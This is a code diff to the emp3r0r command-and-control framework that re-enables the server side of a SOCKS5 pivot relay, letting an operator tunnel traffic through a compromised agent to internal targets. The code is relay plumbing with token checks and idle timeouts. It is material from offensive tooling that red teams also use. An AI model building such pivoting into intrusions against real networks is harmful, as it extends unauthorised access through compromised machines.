@@ -4,9 +4,12 @@ import (
 	"context"
 	"fmt"
 	"io"
+	"net"
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
+	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
@@ -57,10 +60,107 @@ func verifyAuxRouteAgent(agentUUID, remoteAddr, route string) bool {
 	return true
 }
 
+// handleProxyRelayStream is the C2-side endpoint of a SOCKS5 pivot relay.
+// The agent opened this stream (Proxy route) after successfully dialing the
+// requested target; its token identifies the operator-side SOCKS5 connection
+// that is waiting for it. Once matched, the C2 answers the SOCKS5 CONNECT and
+// acts as a pure byte relay between the two.
 func handleProxyRelayStream(conn io.ReadWriteCloser, agentUUID, streamID, remoteAddr string, cancel context.CancelFunc) {
-	logging.Errorf("CRITICAL: proxy relay is disabled; rejecting stream %q from %s", streamID, remoteAddr)
-	cancel()
-	_ = conn.Close()
+	defer cancel()
+	defer conn.Close()
+
+	if !verifyAuxRouteAgent(agentUUID, remoteAddr, "proxy") {
+		return
+	}
+	streamID = strings.TrimSpace(streamID)
+	if streamID == "" {
+		logging.Errorf("CRITICAL: proxy relay: empty stream id from %s", remoteAddr)
+		return
+	}
+
+	entry := lookupPendingProxyEntry(streamID)
+	if entry == nil {
+		logging.Errorf("CRITICAL: proxy relay: unknown token %q from %s (timeout or spoofed)", streamID, remoteAddr)
+		return
+	}
+	if entry.agentUUID != agentUUID {
+		logging.Errorf("CRITICAL: proxy relay: agent %s hijacked token %q owned by %s", strconv.Quote(agentUUID), streamID, strconv.Quote(entry.agentUUID))
+		return
+	}
+
+	// The agent dials the target BEFORE opening this stream, so its arrival is
+	// the CONNECT acknowledgement — answer the operator now.
+	entry.markStreamUp(conn)
+	// The outcome is decided: no dial-failure response will follow, so drop the
+	// job bookkeeping we registered when ordering the agent.
+	clearProxyJobBookkeeping(streamID)
+	if err := socks5Reply(entry.sock, socks5RepSuccess); err != nil {
+		logging.Errorf("proxy relay: CONNECT reply failed for %q: %v", streamID, err)
+		entry.teardown()
+		return
+	}
+	logging.Infof("SOCKS5 relay for %q established (agent %s)", streamID, strconv.Quote(agentUUID))
+
+	relaySOCKS5Stream(entry.sock, conn, streamID)
+	logging.Debugf("proxy relay for %q finished", streamID)
+	entry.teardown()
+}
+
+// relaySOCKS5Stream pumps bytes between the operator-side SOCKS5 connection
+// and the agent's relay stream. Data flow in either direction resets the idle
+// timer; when the relay stays idle for socks5RelayIdleTimeout (or either leg
+// finishes) both connections are closed so nothing lingers. The caller owns
+// the surrounding bookkeeping (pending entry etc.) and calls teardown after
+// this returns.
+func relaySOCKS5Stream(sock net.Conn, stream io.ReadWriteCloser, token string) {
+	var lastActivity atomic.Int64
+	lastActivity.Store(time.Now().UnixNano())
+	touch := func() { lastActivity.Store(time.Now().UnixNano()) }
+
+	copyLoop := func(dst io.Writer, src io.Reader) {
+		buf := make([]byte, 64*1024)
+		for {
+			n, rerr := src.Read(buf)
+			if n > 0 {
+				touch()
+				if _, werr := dst.Write(buf[:n]); werr != nil {
+					return
+				}
+			}
+			if rerr != nil {
+				return
+			}
+		}
+	}
+
+	done := make(chan struct{}, 2)
+	go func() {
+		copyLoop(sock, stream) // agent stream -> operator
+		done <- struct{}{}
+	}()
+	go func() {
+		copyLoop(stream, sock) // operator -> agent stream
+		done <- struct{}{}
+	}()
+
+	watch := time.NewTicker(socks5RelayWatchInterval)
+	defer watch.Stop()
+	for {
+		select {
+		case <-done:
+			// One leg finished: close both so the other unblocks.
+			_ = sock.Close()
+			_ = stream.Close()
+			return
+		case <-watch.C:
+			if time.Since(time.Unix(0, lastActivity.Load())) > socks5RelayIdleTimeout {
+				logging.Infof("SOCKS5 relay %s idle for %s, tearing down", token, socks5RelayIdleTimeout)
+				_ = sock.Close()
+				_ = stream.Close()
+				return
+			}
+		}
+	}
 }
 
 func handleWWWRelayStream(conn io.ReadWriteCloser, agentUUID, streamID, remoteAddr string) {
